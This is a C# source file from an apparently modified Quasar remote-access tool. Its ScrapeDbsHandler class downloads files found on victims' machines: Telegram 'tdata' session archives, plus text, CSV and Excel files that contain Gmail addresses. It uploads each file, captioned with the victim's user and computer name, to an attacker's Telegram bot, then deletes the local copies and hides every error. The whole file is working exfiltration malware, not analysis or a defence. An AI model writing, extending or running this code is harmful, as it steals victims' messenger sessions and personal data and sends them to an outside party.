using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Windows.Forms;
using System.IO.Compression;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles ScrapeDbsResponse from a client and downloads matched files, then sends to Telegram.
    /// </summary>
    public class ScrapeDbsHandler : MessageProcessorBase<string>, IDisposable
    {
        private readonly Client _client;
        private readonly FileManagerHandler _fileManagerHandler;
        private readonly object _guardLock = new object();
        private readonly System.Collections.Generic.HashSet<string> _queuedDownloads = new System.Collections.Generic.HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private readonly System.Collections.Generic.HashSet<string> _uploadedLocalPaths = new System.Collections.Generic.HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private readonly System.Collections.Generic.HashSet<string> _processedRemotePaths = new System.Collections.Generic.HashSet<string>(StringComparer.OrdinalIgnoreCase);

        public ScrapeDbsHandler(Client client) : base(true)
        {
            _client = client;
            _fileManagerHandler = new FileManagerHandler(client);
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        public override bool CanExecute(IMessage message) => message is ScrapeDbsResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            var resp = (ScrapeDbsResponse)message;
            if (resp.FilePaths == null)
                resp.FilePaths = new string[0];

            // reset per-run guards so subsequent runs can re-scan Desktop/Documents/Downloads
            lock (_guardLock)
            {
                _queuedDownloads.Clear();
                _uploadedLocalPaths.Clear();
                _processedRemotePaths.Clear();
            }

            // removed debug popup for tdata/db scrape

            foreach (var path in resp.FilePaths)
            {
                try
                {
                    // avoid duplicate downloads of the same remote path
                    bool enqueue;
                    lock (_guardLock)
                    {
                        if (_processedRemotePaths.Contains(path))
                            enqueue = false;
                        else
                        {
                            enqueue = _queuedDownloads.Add(path);
                        }
                    }
                    if (!enqueue)
                        continue;

                    _fileManagerHandler.BeginDownloadFile(path, Path.GetFileName(path), true);
                }
                catch { }
            }
        }

        private async void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            if (transfer.Status == "Completed")
            {
                try
                {
                    lock (_guardLock)
                    {
                        if (!string.IsNullOrEmpty(transfer.RemotePath))
                            _processedRemotePaths.Add(transfer.RemotePath);
                    }

                    // ensure each local file is uploaded at most once
                    lock (_guardLock)
                    {
                        if (!_uploadedLocalPaths.Add(transfer.LocalPath))
                            return;
                    }

                    // IMPORTANT: when file is a .zip (tdata), skip content filters and send directly
                    string ext = Path.GetExtension(transfer.LocalPath);
                    if (!string.IsNullOrEmpty(ext) && ext.Equals(".zip", StringComparison.OrdinalIgnoreCase))
                    {
                        // proceed to upload as-is
                    }
                    else
                    {
                    if (!string.IsNullOrEmpty(ext) && (ext.Equals(".txt", StringComparison.OrdinalIgnoreCase) || ext.Equals(".csv", StringComparison.OrdinalIgnoreCase)))
                    {
                        bool containsGmail = false;
                        try { containsGmail = FileContainsKeyword(transfer.LocalPath, "@gmail.com"); } catch { containsGmail = false; }
                        if (!containsGmail)
                        {
                            return;
                        }
                    }
                    else if (!string.IsNullOrEmpty(ext) && ext.Equals(".xlsx", StringComparison.OrdinalIgnoreCase))
                    {
                        bool containsGmailXlsx = false;
                        try { containsGmailXlsx = XlsxContainsKeyword(transfer.LocalPath, "@gmail.com"); } catch { containsGmailXlsx = false; }
                        if (!containsGmailXlsx)
                        {
                            return;
                        }
                    }
                    }

                    if (!string.IsNullOrWhiteSpace(Settings.TelegramBotToken) && !string.IsNullOrWhiteSpace(Settings.TelegramChatId))
                    {
                        string sourceDir = string.Empty;
                        try { sourceDir = Path.GetDirectoryName(transfer.RemotePath) ?? string.Empty; } catch { }
                        string userAtPc = string.Empty;
                        try { userAtPc = _client?.Value?.UserAtPc ?? string.Empty; } catch { }
                        string captionUser = string.IsNullOrEmpty(userAtPc) ? string.Empty : ("User: " + userAtPc);
                        string captionPath = string.IsNullOrEmpty(sourceDir) ? string.Empty : ("Found at: " + sourceDir);
                        string caption = string.Join(" | ", new[] { captionUser, captionPath }.Where(s => !string.IsNullOrEmpty(s)));
                        await System.Threading.Tasks.Task.Run(() => UploadTelegramDocument(Settings.TelegramBotToken, Settings.TelegramChatId, transfer.LocalPath, caption));
                    }
                }
                catch (Exception ex)
                {
                    // silent on failure
                }
            }
        }

        private static bool FileContainsKeyword(string filePath, string keyword)
        {
            try
            {
                using (var sr = new StreamReader(filePath))
                {
                    string line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        if (line.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0)
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool XlsxContainsKeyword(string filePath, string keyword)
        {
            // Minimal, dependency-free XLSX text search by scanning XML parts inside the zip package
            try
            {
                using (var fs = File.OpenRead(filePath))
                using (var archive = new ZipArchive(fs, ZipArchiveMode.Read))
                {
                    // Prioritize shared strings and worksheets
                    foreach (var entry in archive.Entries)
                    {
                        string name = entry.FullName.Replace('\\', '/');
                        if (!name.StartsWith("xl/", StringComparison.OrdinalIgnoreCase))
                            continue;
                        if (!(name.Equals("xl/sharedStrings.xml", StringComparison.OrdinalIgnoreCase) || name.StartsWith("xl/worksheets/", StringComparison.OrdinalIgnoreCase)))
                            continue;

                        using (var es = entry.Open())
                        using (var reader = new StreamReader(es, Encoding.UTF8, true))
                        {
                            string xml = reader.ReadToEnd();
                            if (!string.IsNullOrEmpty(xml) && xml.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0)
                                return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static void UploadTelegramDocument(string botToken, string chatId, string filePath, string caption)
        {
            string url = $"https://api.telegram.org/bot{botToken}/sendDocument";
            string boundary = "----QuasarBoundary" + DateTime.Now.Ticks.ToString("x");

            var fi = new FileInfo(filePath);
            if (!fi.Exists)
                throw new Exception("Local file not found: " + filePath);

            string uploadPath = filePath;
            string tempFileToDelete = null;

            if (fi.Length == 0)
            {
                // Telegram rejects empty files; create a tiny placeholder with the original name annotated
                string tempDir = Path.Combine(Path.GetTempPath(), "QuasarUploads");
                try { Directory.CreateDirectory(tempDir); } catch { }
                string tempName = Path.GetFileNameWithoutExtension(filePath) + " (empty)" + (string.IsNullOrEmpty(Path.GetExtension(filePath)) ? ".txt" : Path.GetExtension(filePath));
                uploadPath = Path.Combine(tempDir, tempName);
                try
                {
                    File.WriteAllText(uploadPath, "[empty file]\r\n");
                    tempFileToDelete = uploadPath;
                }
                catch (Exception ex)
                {
                    throw new Exception("Failed to prepare placeholder for empty file: " + ex.Message);
                }
            }

            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.KeepAlive = true;
            request.ContentType = "multipart/form-data; boundary=" + boundary;

            string fileName = Path.GetFileName(uploadPath);
            string header = "--" + boundary + "\r\n" +
                           "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n" +
                           "--" + boundary + "\r\n" +
                           "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + (caption ?? string.Empty) + "\r\n" +
                           "--" + boundary + "\r\n" +
                           "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\n" +
                           "Content-Type: application/octet-stream\r\n\r\n";
            byte[] headerBytes = Encoding.UTF8.GetBytes(header);
            byte[] trailerBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");

            long bodyLength = headerBytes.Length + new FileInfo(uploadPath).Length + trailerBytes.Length;
            request.ContentLength = bodyLength;

            using (var reqStream = request.GetRequestStream())
            {
                reqStream.Write(headerBytes, 0, headerBytes.Length);
                using (var fs = File.OpenRead(uploadPath))
                {
                    fs.CopyTo(reqStream);
                }
                reqStream.Write(trailerBytes, 0, trailerBytes.Length);
            }

            try
            {
                using (var response = (HttpWebResponse)request.GetResponse())
                using (var responseStream = response.GetResponseStream())
                using (var reader = new StreamReader(responseStream))
                {
                    var body = reader.ReadToEnd();
                    if (!body.Contains("\"ok\":true"))
                        throw new Exception("Telegram API error: " + body);
                }
            }
            catch (WebException ex)
            {
                using (var resp = (HttpWebResponse)ex.Response)
                using (var stream = resp?.GetResponseStream())
                using (var reader = stream != null ? new StreamReader(stream) : null)
                {
                    var body = reader?.ReadToEnd() ?? ex.Message;
                    throw new Exception("Telegram upload failed: " + body);
                }
            }
            finally
            {
                if (!string.IsNullOrEmpty(tempFileToDelete))
                {
                    try { File.Delete(tempFileToDelete); } catch { }
                }
                try { if (File.Exists(filePath)) File.Delete(filePath); } catch { }
            }
        }

        public void Dispose()
        {
            _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
            MessageHandler.Unregister(_fileManagerHandler);
            _fileManagerHandler.Dispose();
        }
    }
}


